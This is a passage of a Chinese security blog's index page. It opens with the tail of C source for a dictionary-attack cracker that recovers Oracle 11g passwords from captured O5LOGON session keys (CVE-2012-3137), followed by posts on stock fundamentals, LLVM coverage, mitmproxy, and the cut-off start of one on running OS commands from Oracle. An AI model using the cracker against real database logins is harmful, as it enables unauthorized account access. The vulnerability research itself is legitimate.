(&amp;ctx);</span><br><span class="line">    SHA1_Update (&amp;ctx, to_hash, passwd_len+<span class="number">10</span>);</span><br><span class="line">    SHA1_Final (oracle_mixcase_hash, &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ORACLE_TNS_Decrypt_AES192_CBC</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> aes_key_bytes[<span class="number">24</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span>* input, <span class="keyword">int</span> input_len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* output)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    AES_KEY key;</span><br><span class="line">    AES_set_decrypt_key(aes_key_bytes, <span class="number">192</span>, &amp;key);</span><br><span class="line">    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ORACLE_TNS_Encrypt_AES192_CBC</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> aes_key_bytes[<span class="number">24</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span>* input, <span class="keyword">int</span> input_len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* output)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    AES_KEY key;</span><br><span class="line">    AES_set_encrypt_key(aes_key_bytes, <span class="number">192</span>, &amp;key);</span><br><span class="line">    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"o5logoncrack -k server sesskey -s salt -d dict\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> password [<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> aes_key_bytes[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> dict_filename[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> Oracle_MixCaseHash[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> decrypted_server_sesskey[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> encrypted_server_sesskey[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> AUTH_SESSKEY[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> AUTH_VFR_DATA[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> debug = <span class="number">0</span>;</span><br><span class="line">    FILE * fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ch;</span><br><span class="line">    <span class="keyword">int</span> args = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( ( ch = getopt( argc, argv, <span class="string">"k:s:d:v"</span> ) ) != EOF ) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(ch) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'k'</span>:</span><br><span class="line">            HexStringtoBinArray(optarg, AUTH_SESSKEY);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">            HexStringtoBinArray(optarg, AUTH_VFR_DATA);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">            <span class="built_in">strncpy</span>(dict_filename, optarg, <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">            debug = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">        args++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (args &lt; <span class="number">3</span>) usage();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"*************************************************************\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"Oracle 11g TNS AES-192 cracker by zz@nsfocus\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"*************************************************************\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (fp = fopen(dict_filename, <span class="string">"r"</span>)) == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fail to read"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(fgets(password, <span class="number">100</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        len = <span class="built_in">strlen</span>(password);</span><br><span class="line">        <span class="keyword">if</span> (password[len<span class="number">-1</span>] == <span class="number">0xa</span> &amp;&amp; password[len<span class="number">-2</span>] == <span class="number">0xd</span>) &#123;</span><br><span class="line">            password[len<span class="number">-2</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> password[len<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"try `%s'\n"</span>, password);</span><br><span class="line">        <span class="comment">// Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password</span></span><br><span class="line">        ORACLE_MixCase_Hash (password, <span class="built_in">strlen</span> (password), AUTH_VFR_DATA, Oracle_MixCaseHash);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span> (aes_key_bytes,<span class="number">0</span>,<span class="keyword">sizeof</span>(aes_key_bytes));</span><br><span class="line">        <span class="built_in">memcpy</span> (aes_key_bytes,Oracle_MixCaseHash, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            hexdump(<span class="built_in">stdout</span>, <span class="string">"aes_key_bytes"</span>, aes_key_bytes, <span class="keyword">sizeof</span>(aes_key_bytes));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span> (decrypted_server_sesskey, <span class="number">0</span>, <span class="keyword">sizeof</span>(decrypted_server_sesskey));</span><br><span class="line">        ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, <span class="number">48</span>, decrypted_server_sesskey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            hexdump(<span class="built_in">stdout</span>, <span class="string">"decrypted_server_sesskey"</span>, decrypted_server_sesskey, <span class="keyword">sizeof</span>(decrypted_server_sesskey));</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">strncmp</span>(&amp;decrypted_server_sesskey[<span class="number">40</span>], <span class="string">"\x08\x08\x08\x08\x08\x08\x08\x08"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">"\nFound password: %s \n\n"</span>, password);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012" target="_blank" rel="noopener">http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012</a></li>
+<li><a href="http://www.soonerorlater.hu/index.khtml?article_id=512" target="_blank" rel="noopener">http://www.soonerorlater.hu/index.khtml?article_id=512</a></li>
+<li><a href="http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol" target="_blank" rel="noopener">http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol</a></li>
+<li><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137</a></li>
+<li><a href="http://www.openwall.com/lists/john-users/2012/09/28/1" target="_blank" rel="noopener">http://www.openwall.com/lists/john-users/2012/09/28/1</a></li>
+<li><a href="http://marcel.vandewaters.nl/oracle/security/password-hashes" target="_blank" rel="noopener">http://marcel.vandewaters.nl/oracle/security/password-hashes</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/fundamental/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/fundamental/" class="post-title-link" itemprop="url">基本面需要关注的点</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>准备多写点东西，内容将不在局限于网络安全。</p>
+<p>不得不说搞金融的这些人很厉害，各种玩法坑死大家了。<br>除了一般需要关注的点，还需要关注几个地方，其实这些点在某些情况下比PE，ROE 啥的都重要：</p>
+<ul>
+<li>可转债 （一堆家伙喜欢套利）</li>
+<li>配股   （散户不太喜欢配股）</li>
+<li>融资盘 （主力不喜欢太多人做轿子）</li>
+<li>增发   （这个情况比较复杂，增发价是比较重要的）</li>
+<li>质押   （太高可能暴雷）</li>
+<li>GDR   （还是套利）</li>
+<li>商誉   （可能要计提，影响净利润）</li>
+<li>减持   （主力不喜欢给大股东抬轿子)</li>
+</ul>
+<p>要了解这些情况最可靠的方法为读公告，一般情况雪球和东方财富股吧会有人讨论。</p>
+<p><a href="https://xueqiu.com/" target="_blank" rel="noopener">https://xueqiu.com/</a><br><a href="http://guba.eastmoney.com/" target="_blank" rel="noopener">http://guba.eastmoney.com/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/llvm_coverage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/llvm_coverage/" class="post-title-link" itemprop="url">llvm Coverage 可视化</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Google-提供的工具"><a href="#Google-提供的工具" class="headerlink" title="Google 提供的工具"></a>Google 提供的工具</h2><p>Google 提供了一个工具 <a href="https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gn gen out&#x2F;coverage \</span><br><span class="line">    --args&#x3D;&#39;use_clang_coverage&#x3D;true is_component_build&#x3D;false dcheck_always_on&#x3D;true&#39;</span><br><span class="line">$ python tools&#x2F;code_coverage&#x2F;coverage.py \</span><br><span class="line">    crypto_unittests url_unittests \</span><br><span class="line">    -b out&#x2F;coverage -o out&#x2F;report \</span><br><span class="line">    -c &#39;out&#x2F;coverage&#x2F;crypto_unittests&#39; \</span><br><span class="line">    -c &#39;out&#x2F;coverage&#x2F;url_unittests --gtest_filter&#x3D;URLParser.PathURL&#39; \</span><br><span class="line">    -f url&#x2F; -f crypto&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>一些参数的含义:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-b 测试 coverage 的 target 的路径</span><br><span class="line">-o 输出报告的路径</span><br><span class="line">-c 测试 coverage 的命令行</span><br><span class="line">-f 过滤，只显示某些路径的 coverage</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190111174252715_1005029405.png" alt="workflow"></p>
+<p>实际操作表明， coverage.py 不是太好用。 还是需要一步一步来，比较稳妥。</p>
+<h2 id="0-编译"><a href="#0-编译" class="headerlink" title="(0)  编译"></a>(0)  编译</h2><p>在 chromium 项目下，可以直接使用 <code>use_clang_coverage=true and is_component_build=false</code><br>如果不是 chromium 项目， 则需要自己 指定参数， 例如在 skia 项目中，可以这么写：</p>
+<p>args.gn</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cc &#x3D; &quot;&#x2F;home&#x2F;henices&#x2F;clang7&#x2F;bin&#x2F;clang&quot;</span><br><span class="line">cxx &#x3D; &quot;&#x2F;home&#x2F;henices&#x2F;clang7&#x2F;bin&#x2F;clang++&quot;</span><br><span class="line">extra_cflags &#x3D; [ &quot;-fprofile-instr-generate&quot;, &quot;-fcoverage-mapping&quot; ]</span><br><span class="line">extra_ldflags &#x3D; [ &quot;-fprofile-instr-generate&quot;,  &quot;-fcoverage-mapping&quot; ]</span><br></pre></td></tr></table></figure>
+
+<p>如果是自己的项目，使用 clang 编译时加上这两个参数 -fprofile-instr-generate -fcoverage-mapping</p>
+<h2 id="1-生成-Raw-Profiles-文件"><a href="#1-生成-Raw-Profiles-文件" class="headerlink" title="(1) 生成 Raw Profiles 文件"></a>(1) 生成 Raw Profiles 文件</h2><p><code>export LLVM_PROFILE_FILE=&quot;out/report/target.%4m.profraw&quot;</code>  使用这个命令<br>限制 profraw 文件的个数。</p>
+<p>%p      进程 ID<br>%h      hostname<br>%Nm  生成几个 profraw 文件</p>
+<p>写个循环，将所有的样本跑一遍。 timeout 10 指定程序超时时间。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> path ; <span class="keyword">do</span> timeout 10 target  <span class="variable">$i</span> ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>将在 out/report 目录下， 生成  profraw 文件， 如果没有生成， 则说明上面的代码编译出了问题。</p>
+<h2 id="2-生成-Indexed-Profile"><a href="#2-生成-Indexed-Profile" class="headerlink" title="(2) 生成 Indexed Profile"></a>(2) 生成 Indexed Profile</h2><p><code>/home/henices/clang7/bin/llvm-profdata merge -j=1 -sparse -o out/report/coverage.profdata out/report/*.profraw</code></p>
+<p>-sparse 能大幅减小 profraw 文件大小</p>
+<h2 id="3-生成-Coverage-report"><a href="#3-生成-Coverage-report" class="headerlink" title="(3) 生成 Coverage report"></a>(3) 生成 Coverage report</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/home/henices/clang7/bin/llvm-cov show -output-dir=out/report -format=html \</span><br><span class="line">    -Xdemangler c++filt -Xdemangler -n -instr-profile=out/report/coverage.profdata \</span><br><span class="line">    -object=out/coverage/target</span><br></pre></td></tr></table></figure>
+
+<p>打开 out/report/index.html 可以看到详细的 html 报告，非常不错。</p>
+<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190118160208151_604337546.png" alt="llvm-coverge-html"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches" target="_blank" rel="noopener">working with release branches</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/code_coverage.md" target="_blank" rel="noopener">Code Coverage in Chromium</a></li>
+<li><a href="http://logan.tw/posts/2015/04/28/check-code-coverage-with-clang-and-lcov/" target="_blank" rel="noopener">Check Code Coverage with Clang and LCOV</a></li>
+<li><a href="https://github.com/google/oss-fuzz/blob/master/infra/base-images/base-runner/coverage" target="_blank" rel="noopener">oss-fuzz coverage</a></li>
+<li><a href="https://clang.llvm.org/docs/SourceBasedCodeCoverage.html" target="_blank" rel="noopener">Source-based Code Coverage</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/mitmproxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/mitmproxy/" class="post-title-link" itemprop="url">mitmproxy 简介</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>主要特色：Intercept HTTP &amp; HTTPS requests and responses and modify them on the fly</p>
+<p>使用python编写，可以在windows，Linux， Mac 下运行，这点比 fiddler 有优势。可以修改<br>报文内容，这点很不错。</p>
+<ul>
+<li>官方网站： <a href="http://www.mitmproxy.org" target="_blank" rel="noopener">http://www.mitmproxy.org</a></li>
+<li>文档：<a href="http://docs.mitmproxy.org/en/stable/" target="_blank" rel="noopener">http://docs.mitmproxy.org/en/stable/</a></li>
+</ul>
+<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>参考 <a href="http://docs.mitmproxy.org/en/stable/install.html" target="_blank" rel="noopener">http://docs.mitmproxy.org/en/stable/install.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install -y python-pip python-devel libffi-devel openssl-devel libxml2-devel libxslt-devel libpng-devel libjpeg-devel</span><br><span class="line">sudo pip install mitmproxy  <span class="comment"># or pip install --user mitmproxy</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2. 基本使用"></a>2. 基本使用</h2><p>mitmproxy -b a.b.c.d -p 8080</p>
+<ul>
+<li>-b bind address</li>
+<li>-p bind port</li>
+<li>-s “script.py –bar”, –script “script.py –bar”  Run a script. Surround with quotes to pass script</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-b ADDR, --bind-address ADDR</span><br><span class="line">-p PORT, --port PORT  Proxy service port.</span><br><span class="line">-s mitmproxy 脚本</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-mitmproxy-界面操作"><a href="#2-1-mitmproxy-界面操作" class="headerlink" title="2.1 mitmproxy 界面操作"></a>2.1 mitmproxy 界面操作</h3><pre><code>- ？            显示帮助信息
+- i, j, k, l    上下左右，同 vi
+- enter         进入具体报文
+- tab           详细报文内容页面，显示标签调整
+- E             导出报文内容</code></pre><h2 id="3-HTTPS"><a href="#3-HTTPS" class="headerlink" title="3. HTTPS"></a>3. HTTPS</h2><p>使用mitmproxy 最大的原因就是因为它可以对付https报文。</p>
+<h3 id="3-1-导入mitmproxy的-CA"><a href="#3-1-导入mitmproxy的-CA" class="headerlink" title="3.1 导入mitmproxy的 CA"></a>3.1 导入mitmproxy的 CA</h3><p>参考 <a href="http://docs.mitmproxy.org/en/stable/certinstall.html" target="_blank" rel="noopener">http://docs.mitmproxy.org/en/stable/certinstall.html</a></p>
+<p>mitmproxy 的 CA 证书放在 ~/.mitmproxy 目录， 可以在不同设备中添加。</p>
+<h3 id="3-2-目标设备为Linux"><a href="#3-2-目标设备为Linux" class="headerlink" title="3.2 目标设备为Linux"></a>3.2 目标设备为Linux</h3><h4 id="☆-Google-Chrome"><a href="#☆-Google-Chrome" class="headerlink" title="☆ Google Chrome"></a>☆ Google Chrome</h4><p>设置 -&gt; HTTPS/SSL -&gt; 证书管理 -&gt; 授权中心</p>
+<h4 id="☆-Firefox"><a href="#☆-Firefox" class="headerlink" title="☆ Firefox"></a>☆ Firefox</h4><p>没用Firefox，估计也类似。</p>
+<p>然后设置浏览器使用mitmproxy代理即可。</p>
+<h3 id="3-3-目标设备为-Android"><a href="#3-3-目标设备为-Android" class="headerlink" title="3.3 目标设备为 Android"></a>3.3 目标设备为 Android</h3><h4 id="3-3-1-导入证书"><a href="#3-3-1-导入证书" class="headerlink" title="3.3.1 导入证书"></a>3.3.1 导入证书</h4><p>adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/Download</p>
+<p>设置 -&gt;  安全 -&gt; 证书存储 -&gt; 从手机存储安装， 选择上传的CA证书。</p>
+<h4 id="3-3-2-设置代理"><a href="#3-3-2-设置代理" class="headerlink" title="3.3.2 设置代理"></a>3.3.2 设置代理</h4><p>emulator 上可以通过下面的命令行，设置代理。</p>
+<p>./emulator -avd 7.0_x86 -http-proxy <a href="http://a.b.c.d:8080" target="_blank" rel="noopener">http://a.b.c.d:8080</a></p>
+<p>真实的设备上，据网络上的文章说，可以通过设置 APN来实现，没有测试。</p>
+<h4 id="3-3-3-启动-mitmproxy"><a href="#3-3-3-启动-mitmproxy" class="headerlink" title="3.3.3 启动 mitmproxy"></a>3.3.3 启动 mitmproxy</h4><p>mitmproxy -b a.b.c.d -p 8080</p>
+<h2 id="4-透明模式"><a href="#4-透明模式" class="headerlink" title="4. 透明模式"></a>4. 透明模式</h2><p>mitmproxy 支持透明部署，具体的方法可以参考下面的文章。</p>
+<p><a href="http://docs.mitmproxy.org/en/stable/transparent/linux.html" target="_blank" rel="noopener">http://docs.mitmproxy.org/en/stable/transparent/linux.html</a></p>
+<h2 id="5-修改报文内容"><a href="#5-修改报文内容" class="headerlink" title="5. 修改报文内容"></a>5. 修改报文内容</h2><p>github 上有很多例子，这次没有需求，可以参考</p>
+<p><a href="https://github.com/mitmproxy/mitmproxy/tree/v0.18.2/examples" target="_blank" rel="noopener">https://github.com/mitmproxy/mitmproxy/tree/v0.18.2/examples</a></p>
+<p>官方文档上给了个简单例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(flow)</span>:</span></span><br><span class="line">    flow.response.headers[<span class="string">"newheader"</span>] = <span class="string">"foo"</span></span><br></pre></td></tr></table></figure>
+
+<p>给http响应报文的头部添加一个 newheader 的字段。</p>
+<h2 id="6-socks-模式"><a href="#6-socks-模式" class="headerlink" title="6. socks 模式"></a>6. socks 模式</h2><p>–socks 作为 SOCKS5 proxy server</p>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>这里说到的内容非常少，mitmproxy这个工具还是很强大的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/oracle_run_os_cmd/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/oracle_run_os_cmd/" class="post-title-link" itemprop="url">Execute os command in Oracle Database</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p>
